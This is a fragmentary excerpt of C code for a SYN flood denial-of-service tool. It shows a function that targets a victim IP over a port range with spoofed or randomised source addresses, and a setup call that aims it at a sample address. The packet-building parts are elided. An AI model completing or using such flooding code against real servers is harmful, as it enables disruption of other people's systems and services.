...
*/
void syn_flood (char * victimServerIp, int portStart, int portEnd, int randomIp, char * spoofIp, int nPackets)
{
	//Create a raw socket
	...
	for (int i = 0; i < nPackets; i++){
        int curPort = (i % portEnd) + portStart;

        if (randomIp){
            random_ip_gen (source_ip);
        }
...
void syn_flood_setup(){
    ...
    syn_flood("1.2.3.4", 20, 30, 0, "192.168.3.3", 10);
}